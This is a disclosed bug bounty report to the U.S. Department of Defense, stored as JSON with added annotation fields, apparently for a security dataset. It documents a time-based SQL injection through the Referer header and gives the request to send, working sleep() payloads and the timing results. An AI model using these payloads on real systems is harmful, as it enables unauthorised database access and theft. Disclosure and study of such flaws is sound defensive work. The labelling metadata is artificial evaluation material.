{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "yassinek3ch ",
  "title": "[SQLI ]Time  Bassed Injection at \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 via referer header",
  "content": "\nHi\nthe \u2588\u2588\u2588\u2588 was vulnerable to time bassed injection via referer header\nsteps\n1- copy the request to your burp suite :\nCode 792 Bytes\n1Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n2User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0\n3Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n4Accept-Language: en-US,en;q=0.5\n5Accept-Encoding: gzip, deflate\n6Connection: close\n7\u2588\u2588\u2588\u2588=*\n8Upgrade-Insecure-Requests: 1\n9Referer: http://www.google.com/search?hl=en&q='+(select*from(select(sleep(7*7)))a)+' ```\n10\n11the injection point is``` Referer: http://www.google.com/search?hl=en&q=*```\n12\n13payload > '+(select*from(select(sleep(7*7)))a)+'  > 7*7 = 49.> 49,708 mills\n14\u2588\u2588\u2588\u2588\u2588\n15\n16payload > '+(select*from(select(sleep(20)))a)+'  > 20 = 20,208 mills\n17\n18\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n19\n20payload>  '+(select*from(select(sleep(20+10)))a)+'  > 10+20=30 > 30,289 mills\n21\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n22\n23## Impact\n24\n25SQL Injection, attacker can dump the database of \u2588\u2588\u2588\u2588\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "SQL Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1602891960,
  "report_url": "https://hackerone.com/reports/995122",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Copy the request to Burp Suite and modify the 'Referer' header to include a time-based SQL injection payload."
    ],
    [
      2,
      "Send the modified request and observe the response time to confirm the injection is successful."
    ]
  ],
  "vuln_description": "The vulnerability is a time-based SQL injection via the 'Referer' header, allowing an attacker to execute arbitrary SQL queries and potentially dump the database by manipulating the response time of the server.",
  "reason": "The attack involves a straightforward manipulation of the 'Referer' header with a common SQL injection technique (time-based). It does not require complex interactions or understanding of multiple components.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "The SQL injection vulnerability involves manipulating the Referer header to execute time-based SQL queries, which is not related to authentication or authorization bypass. The described methodology focuses on testing authorization boundaries by swapping user sessions or resource IDs, not on detecting SQL injection via header manipulation.",
    "is_detectable": false
  },
  "injection_metadata": {
    "reasoning": "The vulnerability involves time-based SQL injection via the Referer header - a parameter that would be captured during regular navigation logging. The payloads used (sleep(20), sleep(7*7)) are simple mathematical expressions without custom filter bypasses. Response time delays are detectable in the same HTTP channel without requiring stored payload triggering through complex navigation. The methodology's parameter extraction and simple payload testing would identify this vulnerability.",
    "is_simple_injection": true
  }
}